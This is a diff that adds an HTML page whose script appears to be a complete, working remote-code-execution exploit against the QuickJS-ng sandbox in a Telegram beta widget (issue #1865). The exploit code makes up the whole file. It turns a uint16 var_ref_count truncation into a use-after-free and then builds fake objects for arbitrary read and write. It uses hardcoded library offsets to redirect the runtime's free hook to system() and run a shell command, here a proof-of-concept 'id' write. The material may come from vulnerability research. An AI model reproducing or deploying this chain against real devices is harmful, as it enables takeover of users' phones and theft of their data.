@@ -1,0 +1,197 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>1865 rce</title>
+<div id="w">1865 rce: start</div>
+<script>
+/* Telegram 13.2.0 beta widget sandbox - quickjs-ng snapshot [2026-10-08, 2026-10-30)
+ * issue #1865: uint16 var_ref_count truncation -> OOB JSVarRef write -> UAF
+ *              -> arbitrary read/write -> JSRuntime allocator hook -> system().
+ *
+ * DEVICE CHAIN (stage 2 of 2). bionic/Scudo groom: eval the 131 KB generator
+ * source FIRST, then allocate the 1 MB groom buffer b0, then g() (frame below
+ * b0). get_var_ref(y) writes a real JSVarRef* into b0. The var_ref is never
+ * closed (outside the truncated var_refs[]), the frame is freed on completion
+ * and reused by buf2. A fake BigInt over V leaks V->pvalue (= F, the buffer
+ * address), a fake indirect string gives arbitrary read, a fake Uint8Array
+ * gives arbitrary write, then:
+ *     base  = js_free - 0x1739aec   (js_def_free in libtmessages.49.so)
+ *     free  = *(base + 0x1960430)   (free@GOT, BIND_NOW)
+ *     system= free + 0x26df0
+ *     *(rt+64) = command ; *(rt+16) = system ; free a >512 B block.
+ * If the ELF magic check at base fails, the code falls back to
+ * "js_free is libc free" (branch B) and says so in S3b.
+ *
+ * Markers: S0, S1 (V/off), S2 (pv/F/PVOFF), S3 (ctx/rt/jsf), S3b (branch,
+ * free/system), S4 (reader/writer), S5 (rt16/rt64 readback), S6 (freed),
+ * ERR ...
+ */
+(function () {
+  var W = document.getElementById('w');
+  var LOG = [];
+  function mark(s) {
+    LOG.push(s);
+    function paint() { try { W.textContent = LOG.join(' | '); } catch (e) {} }
+    paint();
+    try { requestAnimationFrame(paint); } catch (e) {}
+  }
+  function u32le(a) { return (rd(a, 4).match(/../g) || []).reverse().join(''); }
+  var rd_dv = null;                       /* DataView of buf2 (fake string reader) */
+  var reader = null;
+  function rd(a, n) {
+    rd_dv.setBigUint64(0x118, a, true);
+    var s = '';
+    for (var i = 0; i < n; i++) { var b = reader.charCodeAt(i); if (b > 255) b &= 255; s += ('0' + b.toString(16)).slice(-2); }
+    return s;
+  }
+  function rdq(a) { var s = rd(a, 8), r = 0n; for (var i = 7; i >= 0; i--) r = (r << 8n) | BigInt(parseInt(s.slice(i*2, i*2+2), 16)); return r; }
+  function rd32(a) { var s = rd(a, 4); return parseInt(s.slice(6,8)+s.slice(4,6)+s.slice(2,4)+s.slice(0,2), 16) >>> 0; }
+  try {
+    /* ---- constants: device libtmessages.49.so + libc (md5 44e776da...) ---- */
+    var DEV_JS_DEF_FREE = 0x1739aec;
+    var DEV_FREE_GOT    = 0x1960430;
+    var DEV_SYS_DELTA   = 0x26df0;      /* system = free + 0x26df0 */
+    var LIBC_FREE_OFF   = 0x3df70;      /* branch B: js_free is libc free */
+    var LIBC_SYS_OFF    = 0x64d60;
+    var CMD = "id > /data/user/0/org.telegram.messenger.beta/cache/rce_proof";
+    var ALLOC = 1048776;                /* measured frame size (lab v0.17.0) */
+    var BASEOFF = 65533 * 16;           /* frame arg_buf[y] = pvalue - buf2 */
+
+    /* ---- build + parse g first, then b0, then the frame ---- */
+    var params = "x,".repeat(65533) + "y";
+    eval("function* g(" + params + "){" +
+         "if (0) eval('');" +
+         "var f=()=>y, a=0, b=0, c=0, d=0;" +
+         "yield f;" +
+         "}");
+    var b0 = new ArrayBuffer(1048576);
+    var v0 = new Uint8Array(b0);
+    v0.fill(0);
+    globalThis.b0 = b0; globalThis.v0 = v0;
+    var it = g();
+    globalThis.it = it;
+    mark('S0');
+    var f = it.next().value;            /* OOB write of JSVarRef* into b0 */
+    globalThis.f = f;
+    var V = 0n, off = -1;
+    for (var i = 0; i < v0.length; i += 8) {
+      var lo = (v0[i] | (v0[i+1] << 8) | (v0[i+2] << 16) | (v0[i+3] << 24)) >>> 0;
+      var hi = (v0[i+4] | (v0[i+5] << 8) | (v0[i+6] << 16) | (v0[i+7] << 24)) >>> 0;
+      if (lo || hi) { V = BigInt(hi) * 4294967296n + BigInt(lo); off = i; break; }
+    }
+    if (V === 0n) { mark('S1 NOLEAK'); return; }
+    globalThis.V = V;
+    mark('S1 V=0x' + V.toString(16) + ' off=' + off);
+
+    it.next();                          /* generator completes; frame freed */
+    var buf2 = new ArrayBuffer(ALLOC);
+    var dv = new DataView(buf2);
+    globalThis.buf2 = buf2; globalThis.dv = dv;
+    rd_dv = dv;
+
+    /* ---- locate pvalue offset: probe for the frame reuse (handles small frame-size drift) ---- */
+    var PVOFF = BASEOFF, found = false;
+    var loD = -2048, hiD = buf2.byteLength - BASEOFF - 16;
+    for (var d = loD; d <= hiD; d += 8) {
+      var o = BASEOFF + d;
+      dv.setBigUint64(o, 0x3ff3c0c9539b8887n, true);   /* double 1.234567 */
+      dv.setBigUint64(o + 8, 8n, true);                /* JS_TAG_FLOAT64 */
+      var probe = f();
+      if (typeof probe === 'number' && probe > 1.2345 && probe < 1.2346) { PVOFF = o; found = true; break; }
+    }
+    if (!found) { mark('S2 NOFRAME'); return; }
+
+    /* ---- fake BigInt over V: read-only toString, no fake operators ----
+     * The engine's BigInt *operator* paths read the fake refcount at P-4:
+     * with P=V+0x0C that is the low half of the GC link at V+0x08, whose
+     * bit 31 is set, so the engine frees the fake BigInt (device
+     * tombstone_17).  Device-safe layout: P=V+0x14, so the fake refcount
+     * at V+0x10 is the flags/pad word 0x01000000 (positive), len at
+     * V+0x14 is 0x77, tab=V+0x18=pvalue -> pv=bits 0..63, sf=bits 128..191.
+     * 47-bit lab/guard: P=V+0x0D (len 0x7f), tab=V+0x11; pvalue at
+     * tab+7 (bit 56), sf at tab+0x17 (bit 184).
+     * Only big.toString(16) is used on the fake BigInt.  The parse and all
+     * shifts are real-BigInt operations; the fake refcount is never
+     * touched by an operator path.
+     */
+    var device39 = ((V >> 40n) === 0n);
+    var P = device39 ? (V + 0x14n) : (V + 0x0Dn);
+    var pvShift = device39 ? 0n : 56n;
+    var sfShift = device39 ? 128n : 184n;
+    dv.setBigUint64(PVOFF, P, true);
+    dv.setBigUint64(PVOFF + 8, 0xfffffffffffffff7n, true);
+    var big = f();                      /* local + read-only; local free only decrements the flags word */
+    var hs = big.toString(16);
+    var neg = hs.charAt(0) === '-'; if (neg) hs = hs.slice(1);
+    var mag = BigInt('0x' + (hs.length ? hs : '0'));
+    var blen = device39 ? Number((V >> 32n) & 0xffn) : Number((V >> 40n) & 0xffn);
+    var raw = neg ? ((1n << BigInt(32 * blen)) - mag) : mag;
+    var pv = (raw >> pvShift) & 0xFFFFFFFFFFFFFFFFn;
+    var sf = (raw >> sfShift) & 0xFFFFFFFFFFFFFFFFn;
+    var F = pv - BigInt(PVOFF);
+    mark('S2 pv=0x' + pv.toString(16) + ' F=0x' + F.toString(16) + ' off=' + PVOFF);
+
+    /* ---- fake indirect string: arbitrary read ---- */
+    dv.setUint32(0x100, 0x400, true); dv.setUint32(0x104, 0x20000000, true);
+    dv.setUint32(0x108, 0, true); dv.setUint32(0x10C, 0, true);
+    dv.setBigUint64(0x110, 0n, true); dv.setBigUint64(0x118, 0n, true);
+    dv.setUint32(0xFC, 0x10000, true);
+    dv.setBigUint64(PVOFF, F + 0x100n, true);
+    dv.setBigUint64(PVOFF + 8, 0xfffffffffffffff9n, true);
+    reader = f();
+    globalThis.reader = reader;
+
+    /* ---- walk sf -> g -> bytecode -> realm -> rt ---- */
+    var curfunc = rdq(sf + 8n);
+    var bcode = rdq(curfunc + 0x30n);
+    var ctx = rdq(bcode + 0x48n);
+    var rt = rdq(ctx + 16n);
+    var jsf = rdq(rt + 16n);
+    mark('S3 ctx=0x' + ctx.toString(16) + ' rt=0x' + rt.toString(16) + ' jsf=0x' + jsf.toString(16));
+
+    /* ---- branch A: js_def_free; branch B: rt+16 already libc free ---- */
+    var base = jsf - BigInt(DEV_JS_DEF_FREE);
+    var magic = rd32(base);
+    var freeaddr, systemp, branch;
+    if (magic === 0x464c457f) {
+      branch = 'A';
+      freeaddr = rdq(base + BigInt(DEV_FREE_GOT));
+      systemp = freeaddr + BigInt(DEV_SYS_DELTA);
+    } else {
+      branch = 'B';
+      freeaddr = jsf;
+      systemp = jsf + BigInt(DEV_SYS_DELTA);
+    }
+    mark('S3b ' + branch + ' magic=0x' + magic.toString(16) + ' free=0x' + freeaddr.toString(16) + ' sys=0x' + systemp.toString(16));
+
+    /* ---- fake Uint8Array: arbitrary write ---- */
+    var OBJ = 0x1000, TA = 0x1100, BUFOBJ = 0x1200, ABUF = 0x1300;
+    dv.setUint16(OBJ + 0x12, 24, true);                 /* JS_CLASS_UINT8_ARRAY */
+    dv.setBigUint64(OBJ + 0x30, F + BigInt(TA), true);
+    dv.setBigUint64(OBJ + 0x38, 0n, true);
+    dv.setUint32(OBJ + 0x40, 0x1000, true);
+    dv.setUint32(OBJ - 4, 0x10000, true);
+    dv.setUint8(ABUF + 0x09, 0);
+    dv.setBigUint64(BUFOBJ + 0x30, F + BigInt(ABUF), true);
+    dv.setBigUint64(TA + 0x18, F + BigInt(BUFOBJ), true);
+    dv.setBigUint64(PVOFF, F + BigInt(OBJ), true);
+    dv.setBigUint64(PVOFF + 8, 0xffffffffffffffffn, true);
+    var w = f();
+    globalThis.w = w;
+    function wr(a, bytes) { dv.setBigUint64(OBJ + 0x38, a, true); for (var i = 0; i < bytes.length; i++) w[i] = bytes[i]; }
+    function wr64(a, val) { var bs = [], x = val; for (var i = 0; i < 8; i++) { bs.push(Number(x & 0xffn)); x >>= 8n; } wr(a, bs); }
+    mark('S4 writer ok');
+
+    /* ---- command in buf2, hook the allocator, free a >512 B block ---- */
+    for (var i = 0; i < CMD.length; i++) dv.setUint8(0x2000 + i, CMD.charCodeAt(i));
+    dv.setUint8(0x2000 + CMD.length, 0);
+    var cmdaddr = F + 0x2000n;
+    wr64(rt + 64n, cmdaddr);            /* malloc_state.opaque = command */
+    wr64(rt + 16n, systemp);            /* mf.js_free = system       */
+    mark('S5 rt16=0x' + rdq(rt + 16n).toString(16) + ' rt64=0x' + rdq(rt + 64n).toString(16));
+    var s = "A".repeat(4096); s = null; /* js_arena_free -> system(command) */
+    mark('S6');
+  } catch (e) {
+    mark('ERR ' + (e && e.message ? e.message : String(e)));
+  }
+})();
+</script>
